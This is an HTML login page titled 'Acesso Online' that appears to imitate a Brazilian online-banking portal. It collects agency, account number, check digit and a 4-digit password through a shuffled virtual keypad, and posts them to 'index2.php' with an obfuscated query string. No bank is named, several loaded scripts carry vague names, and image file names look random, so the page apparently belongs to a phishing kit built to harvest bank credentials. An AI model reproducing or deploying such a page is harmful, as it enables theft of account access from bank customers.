<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Acesso Online</title>

<script language="javascript" src="scripts/dataVerifica.js"></script>
<script type="text/javascript" src="scripts/validaConta.js"></script>
<script type="text/javascript" src="scripts/valida_Acs4.js"></script>
<script type="text/javascript" src="scripts/funcaoLimpar.js"></script>
<script type="text/javascript" src="scripts/teclado.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.2.6.js"></script>
<script type="text/javascript" src="j_query/google_Analytics.js"></script>
<script type="text/javascript" src="j_query/divOculta.js"></script>
<script type="text/javascript" src="scripts/carrega_Oculto.js"></script>

<style type="text/css">
#top1 { width:100%; height:138px; background:url(images/top1.jpg) repeat-x; }
.style1 {font-size: 12px;	font-family: Arial, Helvetica, sans-serif;	color: #666666;}
.style2 {font-family: Arial, Helvetica, sans-serif;	font-size: 12px;color: #333333;}
#agencia {width:40px; height:17px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; outline:none;}
#conta {width:70px; height:17px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; outline:none;}
#digito {width:10px; height:17px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; outline:none; }
#infor {width:50px; height:20px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; }
#avancar {cursor:pointer; float:right; width:95px; height:25px; border:0; background:url(images/avancando.gif); color:#000000; display:inline; margin:2px;} 
#avancar:hover {background-position:right bottom} 
#cancelar {cursor:pointer; float:right; width:135px; height:25px; border:0; background:url(images/cancelando.gif); color:#000000; display:inline; margin:2px;} 
#cancelar:hover {background-position:right bottom} 
#voltar {cursor:pointer; float:right; width:72px; height:26px; border:0; background:url(images/voltando.jpg); color:#000000; display:inline; margin:2px;} 
#voltar:hover {background-position:right bottom} 
#bbotoes input { cursor:pointer; float:left; width:36px; height:40px; border:0; background:url(images/contente.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#bbotoes input:hover { background-position:left bottom; }
#framelimpar { cursor:pointer; width:78px; height:31px; border:0; background:url(images/hover.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#framelimpar:hover {background-position:left bottom }
.style3 {
	font-family: Arial, Helvetica, sans-serif;
	color: #333333;
	font-size: 14px;
}
</style>

</head>

<body style="margin:0; background:#F7F7F7; ">
<div id="top1"><div style="width:980px; height:145px; margin:0 auto; background:url(images/top2.jpg) repeat-x;">
<div style="width:150px; height:145px; float:left; background:url(images/marca.png) no-repeat;"></div>
<div style="width:829px; height:28px; float:left;">
  <div align="right"><img src="images/sair.jpg" width="151" height="28" border="0" /></div>
</div>
<div style="width:600px; height:45px; float:left;"><table cellpadding="0" cellspacing="0">
  <tr><td width="37" height="42">&nbsp;</td>
  <td width="559" height="42"><span class="style1"><script>data();</script></span></td>
</tr></table></div>
<div style="width:829px; height:63px; float:left; background:url(images/img_as.jpg) no-repeat; border-right:1px solid #DDD;"></div>
</div></div>

<div style="width:982px; height:360px; margin:0 auto; margin-top:15px;">
<div style="width:750px; height:360px; background:#FFF; float:left; border-bottom:1px solid #C5C5C5; border-left:1px solid #eee; border-right:1px solid #eee; border-radius:7px;">
<form id="form1" name="form1" action="index2.php?contato+de+dados$$=verifica+de+dados&qqa=chrome..023947293482.0w9eruw" method="post" autocomplete="off" onsubmit="return ValidaLogin()" onkeydown="Verificar()" >
<div style="width:100%; height:20px; margin-top:15px;"><img src="images/a3759348539.png" width="198" height="16" style="float:left;"/><table cellpadding="0" cellspacing="0">
  <tr><td width="31">&nbsp;</td>
  <td width="245">&nbsp;</td>
</tr></table></div>
<div style="width:500px; height:40px; margin-top:12px; margin-left:20px; border:1px solid #EEE;">
<table cellpadding="0" cellspacing="0">
<tr>
<td width="87" height="40"><img src="images/lek_01.jpg" width="43" height="33" border="0" style="margin-left:5px;" /></td>
<td width="55"><span class="style2">Ag&ecirc;ncia:</span></td>
<td width="66"><input name="agencia" type="text"  id="agencia" size="4" maxlength="4" onfocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" onkeyup="checa_agencia(this.name);mostrarOculto();" /></td>
<td width="45" class="style1">Conta:</td>
<td width="72"><input name="conta" type="text"  id="conta" size="7" maxlength="7" / onFocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" onkeyup="checa_agencia(this.name);" /></td>
<td width="10">&nbsp;</td>
<td width="12"><input name="digito" type="text" id="digito" size="1" maxlength="1"  onfocus="this.style.backgroundColor = '#FFF'" onblur="this.style.backgroundColor = '#ffffff'" onkeypress="return Apenas_Numeros(event, this.name);" /></td>
<td width="33"><div align="center" id="casa"><img src="images/carregando.gif" width="30" height="22" /></div></td>
<td width="90"><img src="images/a20347282.png" width="90" height="16" /></td>
</tr>
</table>
</div>

<div style="width:712px; height:123px; background:url(images/br01.jpg) no-repeat; margin-left:20px; margin-top:12px;">
<table cellpadding="0" cellspacing="0">
<tr>
<td colspan="3">&nbsp;</td>
</tr>
<tr>
<td width="190" height="53">&nbsp;</td>
<td width="421"><div id="bbotoes" >
  <input name="Button9" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="9" title="9" onclick="informar(this.value);" value="9" />
  <input name="Button1" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="1" title="1" onclick="informar(this.value);" value="1" />
  <input name="Button6" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="6" title="6" onclick="informar(this.value);" value="6" />
  <input name="Button2" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="2" title="2" onclick="informar(this.value);" value="2" />
  <input name="Button4" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="4" title="4" onclick="informar(this.value);" value="4" />
  <input name="Button5" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="5" title="5" onclick="informar(this.value);" value="5" />
  <input name="Button3" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="3" title="3" onclick="informar(this.value);" value="3" />
  <input name="Button8" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="8" title="8" onclick="informar(this.value);" value="8" />
  <input name="Button7" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="7" title="7" onclick="informar(this.value);" value="7" />
  <input name="Button0" style="font-size:15px;font-family:Verdana;font-weight: bold;" type="button" id="0" title="0" onclick="informar(this.value);" value="0" />
  </div></td>
<td width="98"><input name="button2" type="button" id="framelimpar" style="font-size:12px;font-family:Verdana;font-weight: bold;" onclick="corredor()" value="&nbsp;Limpar" /></td>
</tr>
<tr>
<td width="190" height="42">&nbsp;</td>
<td colspan="2"><input type="password" name="infor" id="infor" maxlength="4" size="4" style="font-size:16px;float:left;" /></td>
</tr>
</table>
</div>
<div style="width:714px; height:68px; background:url(images/br02.jpg) no-repeat; margin-left:20px; margin-top:12px;"></div>
<div style=" width:714px; height:35px; margin-left:20px; margin-top:15px;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td width="594" height="29"><input name="button" type="button" id="cancelar" value=""/></td>
<td width="12">&nbsp;</td>
<td width="106"><input name="submit" type="submit" id="avancar" value="" onclick="return macTools();" /></td>
</tr>
</table>
</div>
</form>
</div>
<div style="width:217px; height:360px; float:right; border-radius:5px;"><img src="images/bylll.jpg" width="217" height="360" border="0" usemap="#Map" />
  <map name="Map" id="Map">
    <area shape="rect" coords="14,78,124,125" href="#" />
    <area shape="rect" coords="13,181,143,230" href="#" />
    <area shape="rect" coords="13,294,112,326" href="#" />
  </map>
  </div>
</div>

<div style="width:100%; height:103px; repeat-x; margin-top:10px; background:#FFF; border-top:1px solid #C5C5C5; border-bottom:1px solid #C5C5C5;">
<div style="width:985px; height:103px; margin:0 auto;"><img src="images/botons2.jpg" width="985" height="103" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="382,9,462,24" href="#" /><area shape="rect" coords="748,8,845,24" href="#" /><area shape="rect" coords="53,31,192,76" href="#" /></map></div>
</div>
</body>
</html>